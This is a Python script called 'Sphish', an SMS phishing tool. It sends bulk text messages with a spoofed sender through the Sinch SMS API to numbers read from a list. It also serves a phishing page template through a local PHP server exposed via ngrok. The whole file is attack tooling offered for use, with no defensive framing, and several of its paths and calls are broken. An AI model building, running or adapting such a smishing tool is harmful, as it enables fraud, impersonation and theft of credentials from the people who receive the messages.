
```python
#!/usr/bin/python3

from pwn import *
from sys import exit
from subprocess import getoutput
from os import system, remove, getcwd, makedirs
from colored import fg, attr
from time import sleep
from argparse import ArgumentParser
from requests import post
from wget import download
from shutil import move
import tarfile
import os

burp = {'http': 'http://127.0.0.1:8080'}

parser = ArgumentParser()

parser.add_argument('-c', '--check', help='check and install dependencies', action='store_true')
parser.add_argument('-n', '--ngrok', help='Install and configure ngrok')
parser.add_argument('-s', '--sms', help='config and send sms with API, set ID argument',)
parser.add_argument('-a', '--all', help='Smishing with Ngrok')

args = parser.parse_args()

def def_handler(sig,frame):
	print('\n  Exiting...\n')
	exit(0)
signal.signal(signal.SIGINT, def_handler)

class Sphish():
	def __init__(self, ngrok, user, id):
		self.__ngrok = ngrok
		self.__user = user
		self.__id = id

	def banner(self):
			print(f"""%s
			███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
			██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║
			███████╗██████╔╝███████║██║███████╗███████║
			╚════██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
			███████║██║     ██║  ██║██║███████║██║  ██║
			╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
								Created by %sWackyH4cker""" % (fg('cyan'), fg('red')))

	def dependencies(self):
		self.banner()
		with log.progress('Executed as') as p1:
			if self.__user == 'root':
				dependencies = ['php', 'wget']

				for i in dependencies:
					p1.success(self.__user)
					p2 = log.progress(i)
					if getoutput(f'command -v {i}'):
						sleep(1.5)
						p2.success('%s✔%s' % (fg('green'), attr('reset')))
					else:
						p2.failure('%s✘%s' % (fg('red'), attr('reset')))
						system(f'apt-get install {i} -y > /dev/null 2>&1')
			else:
				p1.failure(self.__user+', use %sroot%s.' % (fg('green'), attr('reset')))
				exit(1)


	def ngrok_download(self):
		self.dependencies()
		with log.progress(self.__ngrok) as p1:
			try:
				download('https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz')
				p1.success('%s✔%s' % (fg('green'), attr('reset')))
				with tarfile.open('ngrok-v3-stable-linux-amd64.tgz', 'r') as t:
					t.extract('ngrok')
					if os.path.exists('ngrok-v3-stable-linux-amd64.tgz'):
						remove('ngrok-v3-stable-linux-amd64.tgz')
					print()
					try:	
						with log.progress('authtoken') as p2:								
							if getoutput(f'echo {args.ngrok} | wc -c') == '50':
								system(f'./{self.__ngrok} config add-authtoken {args.ngrok} > /dev/null 2>&1')
								sleep(1.5)
								p2.success('%s✔%s' % (fg('green'), attr('reset')))
							else:
								p2.failure('%sInvalid%s' % (fg('red'), attr('reset')))
					except KeyError:
						print('Error')
			except Exception as e:
				p1.failure(e)
				exit(1)


	def send_sms(self, addressee, spoof_number, message):

		url = "https://us.sms.api.sinch.com/xms/v1/" + self.__id + "/batches"

		json_data = {
			"from": spoof_number,
 			"to": [
   				addressee.rstrip()
  			],
  			"body": message
		}

		headers = {
  			"Content-Type": "application/json",
  			"Authorization": f"Bearer {args.sms}"
		}

		r = post(url, json=json_data, headers=headers)

		if r.status_code == 201:
			p1.status(fg('green')+addressee)
		else:
			p2.status(fg('red')+addressee)
			with open('fail.txt', 'a') as f:
				f.write(addressee)

	def open_dictionary(self, route):
		print('\n  %sNote: %sabsolute path in case of another path: [/home/user/dictionary.txt] or relative path in case of the same directory: [dictionary.txt].%s ' % (fg('red'), fg('white'), attr('reset')))
		print('  \033[1mEnter the path of the number dictionary\n%s' % attr('reset'))	
		dictionary = input('%s  [%sPATH%s@%s%s%s]-[%s~%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), route, fg('red'), fg('yellow'), fg('red'), fg('white')))
		try:
			with open(dictionary.rstrip(), "r") as numbers:
				spoof_number = input('%s  [%sFROM%s@%sexample.com%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
				message = input('%s  [%sMESSAGE%s@%sis example...%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
				global p1
				global p2
				print()
				p1 = log.progress('Sending')
				p2 = log.progress('Error')
				for number in numbers:
					self.send_sms(number, spoof_number, message)
				numbers.close()
				print('\n  %sNote: %sFailed numbers saved in fail.txt file. Thanks for using Sphish.\n%s ' % (fg('red'), fg('white'), attr('reset')))
				exit(0)
		except OSError:
			print("\n  %sDictionary path does not exist%s\n" % (fg('red'), attr('reset')))
			exit(1)

	def one_number(self):
		number = input('\n%s  [%sADDRESSEE%s@%s+34XXXXXXXXX%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		spoof_number = input('%s  [%sFROM%s@%sexample.com%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		message = input('%s  [%sMESSAGE%s@%sis example...%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		print()
		global p1
		global p2
		p1 = log.progress('Sending')
		p2 = log.progress('Error')
		self.send_sms(number, spoof_number, message)
		print('\n  %sNote: %sFailed numbers saved in fail.txt file. Thanks for using Sphish.\n%s ' % (fg('red'), fg('white'), attr('reset')))
		exit(0)	

	def ngrok_template(self, route):
		print('\n  \033[1mEnter template to use, must be a directory.\n%s' % attr('reset'))
		template = input('%s  [%sTEMPLATE%s@%s%s%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), route, fg('red'), fg('yellow'), fg('red'), fg('white')))
		
		try:
			makedirs('.sites')
		except FileExistsError:
			pass
		if os.path.exists(template):
			move(template+'/*', route+'/.sites') 
		else:
			print('\n  The specified path does not exist.\n')
			exit(1)
		if os.path.isfile('ngrok'):
			move(route+'/ngrok', '.sites/ngrok')
		else:
			print('\n  Ngrok does not exist, run ./sphish --ngrok <authtoken>.\n')
			exit(1)
		with log.progress('PHP server') as p1:
			try:
				if system('cd .site/ && php -S 127.0.0.1:8080'):
					p1.status('Started %s✔%s' % (fg('green'), attr('reset')))
				else:
					p1.failure('Failed')
				p2 = log.progress('Ngrok server')
				if system(f'./sites/./ngrok http {template} > /dev/null 2>&1 &'):
					p2.status('Started %s✔%s' % (fg('green'), attr('reset')))
				else:
					p2.failure('Failed')
			except:
				print("error")

	def config_sms(self):
		self.dependencies()
		print('\n  %s[%s1%s] %s\033[1mPhone number dictionary%s' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
		print('  %s[%s2%s] %s\033[1mJust a number%s' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
		print('  %s[%s3%s] %s\033[1mSmishing + Ngrok%s\n' % (fg('cyan'), fg('green'), fg('cyan'), fg('white'), attr('reset')))
		option = input('%s  [%ssphish%s@%sroot%s]-[%s$%s]%s ' % (fg('red'), fg('cyan'), fg('yellow'), fg('white'), fg('red'), fg('yellow'), fg('red'), fg('white')))
		number = option.rstrip()
		route = getcwd()
		if os.path.isfile('fail.txt'):
			remove('fail.txt')
		if number == "1":
			self.open_dictionary(route)

		elif number == "2":
			self.one_number()

		elif number == "3":
			self.ngrok_template()
			file = input('\n  ¿Dictionary of numbers? (y/n) ')
			option = file.rstrip()
			if option.lower() == 'y':
				print()
				self.open_dictionary(route)
			elif option.lower() == 'n':
				self.one_number()
			else:
				print('error')
		else:
			print('\n  %sInvalid option' % fg('red'))
			exit(1)


sphish = Sphish('ngrok', getoutput('whoami'), '3dbdd80ac56447449f9ed7c500c4248b') # <- Enter your Service Plan ID

def main():
	if args.check:
		sphish.dependencies()
	elif args.ngrok:
		sphish.ngrok_download()
	elif args.all:
		sphish.config_sms()
		
		sphish.config_sms()
if __name__ == '__main__':
	main()
```
